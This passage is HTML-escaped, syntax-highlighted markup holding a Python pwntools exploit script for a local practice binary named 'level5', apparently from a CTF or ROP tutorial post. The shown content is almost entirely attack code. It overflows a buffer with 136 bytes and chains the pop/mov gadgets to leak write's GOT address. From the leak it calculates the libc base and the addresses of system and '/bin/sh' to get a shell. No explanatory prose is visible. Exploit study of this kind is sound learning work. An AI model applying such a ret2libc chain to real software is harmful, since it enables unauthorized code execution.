/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./level5&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;level5&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_addr = &lt;span class=&#34;number&#34;&gt;0x40061a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write_got = elf.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_addr = &lt;span class=&#34;number&#34;&gt;0x400600&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main_addr = elf.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;main&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Hello, World\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload0 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;136&lt;/span&gt; + p64(pop_addr) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p64(write_got) + p64(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) + p64(write_got) + p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p64(mov_addr) + &lt;span class=&#34;string&#34;&gt;&amp;#x27;a &amp;#x27;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;) + p64(main_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write_start = u64(p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;write_addr_in_memory_is &amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(write_start)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#libc=ELF(&amp;#x27;libc.so.6&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base=write_start-libc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr=libc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]+libc_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh=&lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(libc.search(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt;))+libc_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;libc_base_addr_in_memory_is &amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libc_base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#